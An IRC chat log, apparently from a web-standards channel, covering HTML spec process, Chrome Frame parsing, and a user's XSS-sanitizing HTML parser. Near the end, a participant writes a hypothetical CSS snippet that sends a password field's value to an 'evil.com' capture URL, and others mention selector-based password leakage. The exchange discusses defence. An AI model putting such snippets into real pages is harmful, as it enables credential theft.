content.body: All right, I'm out for the night.  Time to go home where we're currently suffering from Day 12 of no internet.
the changing of chairs appears to be more periodic than anything else, occurring every  7-8 months.
Have there been more chair changes than there have been spec publications?
Philip`: I would guess no, because we published 3 drafts initially and at least one of those has been republished
HTML5 is epic
Tristan: glad you like it :-)
othermaciej: what's the plan for PENDING REVIEW?
othermaciej: should i treat that as closed?
Hixie: let me review the set of PENDING REVIEW issues
just trying to work out if i should make the green lighter on the chart, to reduce the emphasis
yes, and I'll propose moving all of those to closed
k
I suppose in theory future "pending review" issues could be less equivalent to CLOSED
technically we need them all to be CLOSED to get to LC, if we take the "zero open issues" thing seriously
ok updated the chart correspondingly
i like how you can tell things change each time the chairs change
e.g. as mike came in, "RAISED" is used for the first time
as you come in, the OPEN count drops like a cliff
and when Sam came in, the open count goes up and down suddenly for a month
can you remind me of the URL?
I hope I can get the OPEN count to keep dropping
http://damowmow.com/playground/htmlwg/chart.html
I don't see that much change in issue state around Sam becoming chair - I guess a little jagginess up and down just after
yeah that's all
ok, I got rid of the 3 Pending Review where I was confident I could do so without further consultation
I'm confused by the chart
there are 2 issues in PENDING REVIEW state and just a little while ago there were 5
but the chart makes it look like there are 50
did you perhaps reverse the CLOSED and PENDING REVIEW counts?
Hixie: ^
hm, maybe
looks
looks like i did, but i can't see why, since i take the states straight from the tracker
oops
i see what happened
i sorted the fields in the header of the csv
but didn't sort the fields of the data rows in the same way!
regenerates the data
that explains a lot
when you remove Origin and split out predefined vocabularies that will let me close 2 more issues by consensus
if MikeSmith proposes H:TML for FPWD as non-normative that will let me close two others
I will do that but not this week
Hixie: it would be interesting to rerun the script that shows who is responsible for the most email on the list by attracting replies
I'm just looking for issues that seem resolvable without major wrangling
(I was basically off this week for Monday through Wednesday due to the so-called Silver Week holidays here in Japan)
yeah no prob
it would be nice to get under 20 OPEN+RAISED
from Hixie's chart it looks like we were very briefly right at 20 for that total
ok finished tweaking the chart
to have pretty colours
would like to see the chart. He likes pretty colours. :)
Mrmil: http://damowmow.com/playground/htmlwg/chart.html
sigh. http://lists.w3.org/Archives/Public/public-rdf-in-xhtml-tf/2009Sep/0281.html
Mrmil: In this case it will only be pleasing if the particular colours you like are green
:) I have troubles seeing the very light green. Talk about tilting someones head. Otherwise pretty cool
Speaking of pretty colours though wtf were they thinking at Yahoo when they added the ugly, wavy, serif, *purple* yahoo logo to the clean, san serif, pink and blue flickr logo?
hsivonen: I noticed that one too. Isn't that actually an XML spec violation. or at least I'd think that expecting that all UAs are going to behave that way is perhaps not too prudent
wonders if Hixie could make a <canvas> tut out of it...
the lightest colour is meant to be more or less invisible
light colors in general don't show up so well on my Apple MikeBook
I tried doing the gamma-adjustment thing but it doesn't seem to help much
or maybe it's a feature that I'm meant to appreciate (the fact that the saturation of the colors changes drastically depending on the angle at which I view the screen)
MikeSmith: DOM Level 2 represents namespace information items as attributes in a magic namespace. the DOM is semi-bogus in terms of the infoset but at least this part is coherent
OK
coerent but evidently highly unintuitive
*coherent
hsivonen: *sigh* because of the DOM Level 1-ness?
othermaciej: sigh because of "surprise" and completely missing the point
http://intertwingly.net/blog/2009/09/22/Chromie is awesomeness
And the follow-up
hsivonen: it's kind of funny that his implementation was designed to work in HTML rather than XHTML when the spec covers the latter but not the former
othermaciej: and Level 1-ness also
othermaciej: no so funny if one wants proper specs for the platform

hsivonen: changing the subject a few degrees - assuming it's intended to capture both real XML namespace declarations, and attributes in HTML that look like them, should the processing requirements say to consider any attribute whose tagName starts with "xmlns:", or separately attributes in the xmlns namespace and attributes in the null namespace whose localNames start with "xmlns:"?
hsivonen: and should both be allowed in both syntaxes?
othermaciej: I think dispatching on nodeName is achitecturally unsound
I'm not sure if it's practically different from the two-pronged test
othermaciej: I don't want to go there, but maybe the spec needs to go there to paper over the damage
is it possible to get an attribute whose nodeName starts with "xmlns:" without it being in either the null namespace or the xmlns namespace?
i can't believe y'all are spending so much time on something as fundamentally broken as rdfa
othermaciej: not AFAICT
so either way of saying it would be equivalent in practice, though perhaps the two-pronged version seems architecturally cleaner
Hixie: my thinking on RDFa is that it's less damaging to spec it soundly and unambiguously (including use in text/html) than to not spec it
not because I think it's awesome but because failing to spec it will just create more interop failure
Hixie: my interest is damage mitigation to parts of the stack I work on
otoh maybe the process of specing it will result in some enhancements that make it easier to use right

Hixie: I am strongly reminded of the Sirius Cybernetics Corporation: "[o]ne is blinded to the fundamental uselessness of their products by the sense of achievement one feels in getting them to work at all. In other words, their fundamental design flaws are completely hidden by their superficial design flaws."
that being said, it seems funny that people who don't like RDFa at a design level are much more interested in having a really precise spec for it than people who do like it
hsivonen: i guess it shows Ben's level of experience with XHTML and the DOM
it's more that the time you're spending on this feature is time not spent on many much more important features that much more desperately need speccing
like, DOM Core
user interaction events like 'click'
even DOM Traversal and DOM Range would be more important than RDFa
Hixie, about the metadata issue. when do you think will this part of the spec have a chance of becoming stable ?
erlehmann: hm?
I don't think I can help DOM Core without a competent person stepping up to be editor
but I can probably help File API
planning to go over it with weinig and/or ap soon
Hixie, well, when i built something with microdata and the spec changed, i raged a little for being so careless and not asking if this feature is intended to be stable.
so i guess i should use RDFa for now, till HTML5 gets its way
erlehmann: oh you mean microdata?
erlehmann: we're doing studies for microdata in the coming days, the spec should be done in a few weeks
oh nice :)
i wonder if chrome frame looks at the x-ua-compatible http header
zcorpan, i wonder why chrome frame doesn't actually trigger when IE is in „standards“ mode.
erlehmann: that'd break sites
well, to the same extent they break in chrome, i guess, but surely that's enough for people to uninstall the plugin
zcorpan, really ? wouldnt IE-broken sites trigger quirks mode anyway ?
erlehmann: uh, no

zcorpan, so what kind of breakage are you referring to ? i must admit i have not touched internet explorer for more than a year, except to make test screenshots of CSS layouts (does everything look alright ? hell, no.).
well, imagine a bank that uses an xhtml doctype and requires activex to log in
doesn't chrome come with an activeX shim plugin, like mozilla browsers do on windows ?
dunno
does firefox have an activex shim by default?
zcorpan: not by default afaik
ok
zcorpan: that wouldn't promote freedom and choice of OS on the Internet
indeed
wise words, hsivonen, wise words.
i wonder, will chrome frame be able to run in chrome's quirks mode?
notes that http://ben.adida.net/index.xhtml has its style sheet commented out
Hixie: maybe we should change <style>'s and <script>'s processing model to also look at comment nodes, not just text nodes
why would we do that
Just tell people not to use comments in style/script
zcorpan: XML processors are permitted to discard comments
hsivonen: hmm, good point
and if they still want Netscape 2 compatibility then they shouldn't be using XHTML
Hixie: to ease migration to xhtml
comments are comments
we're not going to execute script in comments
that's a security nightmare waiting to happen
ok last chance for people to comment on the microdata study materials http://damowmow.com/playground/microdata/
looks
Hixie: you're not going to do usability study on reversed dns identifiers?
no
not sure how we would do that

"the time you're spending on this feature is time not spent on many much more important features that much more desperately need speccing, like, DOM Core, user interaction events like 'click'" - those would require us to do all the work, whereas with RDFa the RDFa people can do most of the work and just need to be guided in the direction that we want
http://groups.google.com/group/google-chrome-frame/msg/c9fd31929ff7d7fc - "we aren't supporting the HTTP header (although we do support a separate MIME type, application/chromeframe)"
sending e-mails is free?
No, but the effect can be much greater than the effort put into writing it
Philip`: ouch, separate mime type?
Seems perfectly sensible given that MIME types are designed to identify the client, not the content
(by which I mean the exact opposite)
what is the chrome team smoking?
is there a heading sent with the request to tell the server that the plugin is available?
I think someone said it adds "chromeframe" to the UA string
(Maybe the MIME type is just an implementation detail of how they make IE re-render the page using the new engine, or something, and not intended to be used externally)
at some point we should do a crawl with the chromeframe UA string to see how many return application/chromeframe

http://wave.google.com/ - <meta name="keywords” content=”online collaboration, online communication, collaborative editing, web application, photo sharing,developer preview" /> - hooray for curly quotes
(They don't even make the page invalid)
(Actually I suppose they do in HTML5 because the keyword won't be recognised)
(...and because there's no content attribute)
(So, okay, they do make the page invalid)
foresees trouble with the chrome frame MIME type
in other news, I got a split parser Gecko finally show me some content
hmm, two new entities
+ bsolhsub; U+027C8
+ suphsol; U+027C9
sigh. the dual parser core stuff still isn't right, though
zcorpan: did the Math WG just mint those?
dunno
wonders what those represent
Because they look more like fortran 77 variable names than anything
i wonder why mathml has all these entities at all
zcorpan: It's nice for hand authouring, like LaTeX.
mathml is not nice for hand authoring
Of course the rest of MathML sucks for hand authoring
SEE WHAT MATHML DOES TO IRC ?
erlehmann: shh, don't mention its name
zcorpan, but you were AWAY
each entity causes 3 users to disconnect
U+27C8 Reverse Solidus Preceding Subset
U+27C9 Superset Preceding Solidus
Hello! is there anybody alive?
i'm alive!
Everyone's dead Dave
hey :), could you give me suggestions about a security program Im making in javascript.. part of it is to parse HTML, and I have some doubts
this case: <script>x='<a href="</script>">';</script>
should I make an exception for certain tags?
or whats the deal with <script>
sirdarckcat: what are you trying to do?
do you know CSP?
Im trying to implement something similar to CSP, but as a javascript script
apparently, it is possible...
but the HTML parser and CSS parsers are a headache
even JS is easier
doesn't know what CSP is
this is my simple HTML parser example: http://eaea.sirdarckcat.net/testhtml.html it removes some dangerous elements
Mozilla CSP - Content Security Policy
ah
https://wiki.mozilla.org/Security/CSP
My approach is something like.....
i guess you need to have an html5 parser and a sanitizer
<html><head><script src="/acs.js">/*your-policy-here*/</script>... the rest of the html code ...
well... Im targetting at quirks mode first
but yeah

quirks mode only affects

parsing
oh, then.. not-standards-compilant-html-parsers
everything is pretty easy I think, except stuff like what to do with unclosed comments, with unclosed tags, wich characters should close an HTML tag before an >, etc..
So everything's pretty easy except for all the hard parts (which HTML5 defines)? :-)
yep
haha
<script>x='<a href="</script>">';</script> results in a script containing "x='<a href="" followed by the text "">';" and the straw </script> tag is dropped
zcorpan, yeah.. but hmm which tags behave like this?
only script and style?
script and style are RAWTEXT elements
um
and xmp
oh
and probably more i'm forgetting
you should really use an html5 parser :)
v.nu is available in javascript
the parser, that is
well, yeah I will use an html5 parser, but.. I dont want to break existing websites.. I  know one of the aims of html5 is this but...
so I will allow the developer to choose
the html5 parser, or the paranoic parser
mine is paranoic
i think chances are the paranoic parser is more likely to break existing websites :P
mmm why?
sirdarckcat: What makes you think that your parser works better than a HTML5 parser
well, its not that it works better.. is that its made specially for the project Im doing hehe
because it's nontrivial to get all the details right and existing content depends on getting all the details right
well, the purpose of the project is to protect against web-based threads
sirdarckcat why is that so?
so I made several decisions based on that objective
web-based threads?
welll.. mostly xss
sirdarckcat: The security comes from the sanitiser and serialiser, not the parser
so the parser might as well be optimised for compatibility instead
ah, threats
yeah threats sorry haha, philip: well.. yes and no
Didn't you know that the web is actually woven from fine thread?
jgraham: true
the differences I have are cases like: <a x"href="....
what about <a x"href="?
and hmm, maybe how to behave where there's an unclosed <
sirdarckcat, your toy breaks my javascript trickery
is it intended that it kills stylesheet and ALL scripts as well ?
and stuff, I dont agree with html5.. haha since as an attacker I see that other approaches are safer (even if not so compatible)
sirdarckcat: I don't understand waht you are saying
@erlehmann -> I disable them for the moment I can disable that if you want
sirdarckcat, i dont quite get what you are doing.
making pages safer by WHAT ?
basically, its a js-implementation of Mozilla CSP
all in favour of me renaming "onseeked" to the more technically correct "onsought"?
Hixie: no
Hixie: Seriously?
Hixie: have implementations shipped?
I don't think I've ever heard the term "sought" used in the context of media seeking
sought is like spelling language
plus, onseeked is implemented already
I think we have a new Referer here
sirdarckcat: We made a sanitizer on top of html5lib that passes these tests: http://code.google.com/p/html5lib/source/browse/testdata/sanitizer/tests1.dat
informs his partner that he will be sticking with "seeked", english be damned
(and some more actually)
(carey is an english major, so apparently this is irksome)
hsivonen: firefox 3.5 fires 'seeked' events
zcorpan: OK. then no, it's not a good idea to rename the event
good that i only use timeupdate
onsought sounds wrong to me anyway
maybe you should let this carey approve your commits as well, Hixie
i didn't seriously consider renaming the event
though having onsought would be pretty hilarious
onslaught !
@jgraham how do I test the sanitizer?
erlehmann: that's what i was going to say
zcorpan, thats what your mom said ^^
sirdarckcat: clone the html5lib hg repository. Go to python/tests/ and run python test_sanitizer.py
thanks :)
jgraham, did you just utterly destroy everything sirdarckcat worked so hard for ?
haha well I dont think so, I want to find a bypass to the sanitizer
I will stick with the parser
for example, apparently IE conditional comments are deleted by the sanitizer..
and IE's conditoonal comments suck... " alt="">
how does ie tokenize conditional comments?
in that case, thats an image
oops
wait
" alt="">
should be like that haha
and ie allows nested comments
<!--[if true]> <!--[if true]>1 <![endif]-->2 <![endif]-->3
and I want to support that :S, but iirc html5 is not compatible with IE weirdness (anyway, I dissagree with ie's parsing rules, I want to support them)
what do you mean by support?
wouldn't you just want to emit what other browsers would treat it as, i.e. "23"?
uh
well... parse what is inside the comment as IE would (or the best I can at least)
which version of ie?
all versions
they're all different
I mean, all support this comment stuff
so what would you do with <!--[if IE 7]>x<![endif]--> ?
@zcorpan, I want to make a parser that will show 1 2 3 on IE and 2 3 on other browsers
"DrWatson Postmortem Debugger has encountered a problem and needs to close. We are sorry for the inconvenience." sigh
@zcorpan, I generate an HTML comment with the content:  [if IE 7]>x<![endif]
thats easy
this is not easy: ">
i thought you wanted to show the x if the browser is ie7
anyway.. those are some of the diffs between html5 and my parser, the comments-inside-attribute-names are other diffs
@zcorpan IE will do that
oh so you serialize and let the browser reparse
I do... document.write(safeCode.innerHTML);
ah
yep
anyway, I really hate IE and Opera
they do it wrong
anyway...
what about <![if !IE]>x<![endif]>
that's left the same
I create an element <![if IE]>
only IE supports doing that
but, thats ok
only IE supports conditional comments anyway
what will happen in other browsers?
I ignore it
ok
anyway.. the way Im parsing the HTML code is not compatible with the rawtext elements :(
so I was wondering, if there are other cases I may be missing

"The following HTML elements have varying levels of special parsing rules: address, area, article, aside, base, basefont, bgsound, blockquote, body, br, center, col, colgroup, command, datagrid, dc, dd, details, dir, div, dl, ds, dt, embed, fieldset, figure, footer, form, frame, frameset, h1, h2, h3, h4, h5, h6, head, header, hgroup, hr, iframe, img, input, isindex, li, link, listing, menu, meta, nav, noembed, noframes, noscript, ol, p,
plaintext, pre, script, section, select, spacer, style, tbody, textarea, tfoot, thead, title, tr, ul, wbr, and xmp."
wow
haha
and then there's scoping elements and formatting elements
read the spec :)
hmm, I have (sort of.. not all hehe)
have you read section 9.2?

btw, about scoping elements and formating elements, the browsers fix this in the dom, so usually I dont have to check for that.. and the other edge case I handle is plaintext, (and xmp/script/style at some degree) but I didnt know all those had special treatments
let me check
9.2 is parsing
yeah
if you've read it, it shouldn't come as a surprise that all those elements have special treatments
hmmm thanks for the pointerm I miss-readed that
I beleived the browser was going to alert on those cases automatically
alert how?
well, like trying to put an <li> outside list, or <option>, trying to append an html node inside a <xmp>
or trying to append a node inside an image
in my tests all browsers didnt allow to do that in the DOM
so I just trusted them
i don't follow
document.createElement("img").appendChild(document.createElement("p"))
oh wait
are special parsing rules
What you do through DOM manipulation has no effect on parsing of HTML.
dc ?
hmm
Im confused
"The following HTML elements have varying levels of special parsing rules"
wonders how much actually would break if HTTP interpreters switched to UTF-8
annevk2: A fair number of password forms
where are the special parsing rules?
gsnedders, aah, really?
gsnedders, they use iso-8859-1?
sirdarckcat: in http://www.whatwg.org/specs/web-apps/current-work/multipage/tokenization.html#tree-construction
or more likely windows-1252
annevk2: Yup. I don't it's defined how they cope with stuff outside of that, though it obviously works.
annevk2: Some UAs use ISO-8859-1, others Windows-1252. It doesn't seem to matter for compat which.

sirdarckcat: for a trivial case of special parsing rules, see "address" (which closes

but is otherwise like a normal element)
@zcorpan wow, I;ve been in that page before but well.. as I said I just made the wrong assumptions on how the browser accepts or doesnt accept the content of the DOM
I'll read the spec more carefully now :)
Reading specs carefully is a good idea :-)
Well, depending on what spec it is
Philip`: Only if you like complaining about them
Some you just need to gather the general concepts from the spec and then trust the details will work themselves out
like HTML+RDFa
That's not really a spec, it's just an early draft with lots of acknowledged issues
Better to pick on examples that are Recs :-)
HTML4

oh, btw.. if someone is interested about the project.. evendo it will utlimatelly probably going to be replaced by Mozilla CSP (once and if its implemented by all browsers), its here: http://google.sirdarckcat.net/acs.doc it has more features than CSP, but well heh
Oh, that really is a Word document.
Nevermind then, I guess
haha.. yes its word.. sorry
one guy from mozilla ask me the documentation, I sent him the doc and then he replied "sorry, I dont use MS office".. xD
I was tempted to send him a link to openoffice :P but well...
he would probably reply "sorry, I dont use openoffice"
You know, there's this document format that works pretty well on the web
It even loads directly in a web browser, without requiring you to download hundreds of megabytes of office suite
Philip`: Yeah, PDF is great
wat
Silverlight?
or is that not a document format?
VRML?
interactive MNG
http://docs.google.com/View?id=ddqtfnx3_381fxp3zjf3
zcorpan: the Silverlight/WPF PDF-alike is called XPS
I think I was using IE8 on Vista and wanted to print a web page to a file
and it had an XPS Writer printer thing
so I did that, but I couldn't manage to open the XPS file again
It just gave me .NET error messages whenever I tried
try openoffice, it can read xps
If I remember correctly, it also got confused because it tried opening the XPS in my default browser, which was no IE, and the XPS viewer seems to be embedded in IE or something
so I was not entirely impressed, and gave up
s/no IE/not IE/
sirdarckcat: I'm not downloading hundreds of megabytes of office suite just to view something equivalent to a PDF
Microsoft XPS Viewer
Download the Microsoft XPS Viewer
Download size: 2.8 MB*
That's what I was using
http://www.microsoft.com/whdc/xps/viewxps.mspx
oh
and it just used the wrong browser and then gave .NET errors
Philip`: clearly it's your fault for using the wrong browser
sirdarckcat: That isn't supported on my OS.
http://www.artifex.com/downloads/
haha
attempts to reproduce
Double click on file in Explorer: download dialog pops up in Opera
"Open with" is XPSViewer.exe
Clicking "Open" opens another download dialog in Opera
haha
the html5 sanitizer looks very good

Pasting the URL into IE spends twenty seconds thrashing the disk (obviously it's competing with Acrobat) and then says "An error occurred in the application you were using" in the normal IE error page style
because of a System.Reflection.TargetInvocationException because of a System.UriFormatException
because there was a colon (':') present but the port could not be parsed
(I guess the URL is "C:\Users\...", because "file:///..." automatically gets converted into that in the address bar)
(unless it's just confused by parsing file:///C:/...)
So, yes, not a good impression of XPS
(and I don't think I've done anything weird on this computer, other than installing browsers and Visual Studio and stuff)
sirdarckcat: I think the way the html5lib sanitiser handles attribute values (particularly CSS) is nasty and ugly
Yeah the CSS handling is really nasty
hmm.. if XP is the bastard child of XD and :P, XPS should have something to do with :S, so that explains it I guess
The overall code isn't especially beautiful (the ginat nested if statement)
But it seems to work pretty well
I'll check it out, but anyway most of the dangerous CSS attributes are gone arent they? url(javascript) expression, moz-binding
might rewrite it someday
It seems like quite a few people actually use the sanitiser for real, so it's seemingly important and useful
btw.. have u guys heard about
reading HTML attributes with CSS
the seamless attribute in iframe just made it more dangerous
anyway, I have to go, thanks for your time guys
How so?
Oh

Maybe he means <style>input[type=password] { background-image: "http://evil.com/capture?" attr(value); }</style><iframe seamless src=http://innocent-site.com/autofilled-login></iframe> or something like that
which sounds bad if there's not some difficulty I'm missing
(I have no idea if that CSS syntax is right, but I assume there's something similar)
you cannot use attr inside url()
Even without attr, you can do stuff like use selectors to detect whether the password value contains 'a', whether it contains 'b', etc
note that seamless only works same-origin
(That's what some example in a PowerPoint slide somewhere does)
Oh, it does?
you cannot do much more than you can do already with JavaScript afaict
"Specifically, when the attribute is set on an element and while the browsing context's active document has the same origin as the iframe element's document ..."
Sounds like XSS is irrelevant then
so that's okay
http://twitpic.com/iqyre lol
hmm, the font doesn't work
zcorpan, is that X in the top corner the webfonts test?
Lachy: yes
it uses the Ahem font, so the glyph for "X" should be a square that covers the red background
that test fails in Chrome as well, so the bug isn't specific to the IE plugin
oh
i thought web fonts worked in chrome
might work in Chromium by now, but Chrome 3.0 is failing for me
also fails in Chrome nightlies on Ubuntu
it stops at 99 after history navigation
kungFuDeathGrip is null
oh, I do get 100/100
i have chromium on mac, though i don't know how often it updates
my latest Chromium also goes to 99/100
Rik|work: http://code.google.com/chrome/chromeframe/ says it's open-source and they wouldn't lie to us
no, they wouldn't, of course
(I was really somewhat including the whole open-source ideology in the term "open-source", not just the OSI definition.)
btw, Chrome isn't open source, Chromium is
Yes, yes, Chrome is only 99% open-source, I know.
Rik|work: http://src.chromium.org/svn/trunk/src/chrome_frame/
http://src.chromium.org/svn/trunk/src/chrome_frame/utils.cc
wonders how HTMLScanner deals with <script> and conditional comments
Looks like it just tokenizes and looks for <meta> tags before <body> tags
it would be "fun" for the flowchart if those are handled differently from how IE itself handles X-UA-Compatible
is HTMLScanner an approximative hack or a real tokenizer?
It's a hack
"fun"
http://src.chromium.org/svn/trunk/src/chrome_frame/html_utils.cc
Looks like it's basically splitting strings on spaces and '=' and '/', if I'm not mistaken
(which I quite possibly am)
when searching for attribute names
so presumably it's going to fail on unquoted content=chrome=1
has anyone on this channel happened to analyze how CNN video pages like http://www.cnn.com/video/#/video/offbeat/2009/09/23/wilhelm.ks.50.states.90.secs.kwch put the text in the layout?
Oh, also it's going to fail on <meta http-equiv="x-ua-compatible" content="chrome=1"> because it does string checks for x-ua-compatible first, I think
that's ok because charset meta detection fails for that, too
And once it's found the x-ua-compatible content attribute value, it does a case-insensitive check for the substring "chrome="
ascii case-insensitive?
I think so
but it's whatever Win32 StrStrI does
There's also a registry setting which can give a list of "opt-in" URLs to always be rendered with Chrome
doesn't know who does the opting in, but assumes it's Google
why does a runtime error in a worker fire a ErrorEvent while a runtime error in <script> invokes the onerror function with three arguments?
Also, the MIME type isn't (as stated) application/chromeframe, it's application/chromepage

Hixie: shouldn't "cut", "copy", "paste" and "beforepaste" be required for implementations at least, for compatibility with existing content?
Hixie: also, even if it makes sense to say everything draggable should be copyable, I don't think it makes sense to require that every time in the UI you can use the Copy command, you can also drag
that's not how native UIs work
it's not clear to me how else to make copy and paste work
has anyone yet done a post mortem on how local storage got into so many browsers before the concurrency problems were considered on the current level of detail?
Hixie: how about via the copy/paste events that browsers already support and which are used by content?
hsivonen: Maybe the process was something like "Ooh, shiny! *hack* *hack* *hack* *release*"?
othermaciej: are those good? it seems like they would encourage authors to only support drag and drop and not copy and paste, since they'd have to implement both to get both.
hsivonen: i don't know that there's more to it than Philip` said
Hixie: I don't see how that conclusion follows - one could certainly support copy/paste events while making drag/drop events also work via the copy/paste UI
Hixie: in fact, that is what browsers will have to do anyway if they implement the HTML5 spec as written and choose not to break existing content
Hixie: so it would be nice if there was a spec that describes how it works
othermaciej: is there much existing content using the current events? i haven't looked into it much.
othermaciej: i guess it's something to add to the list http://wiki.whatwg.org/wiki/Companion_specifications
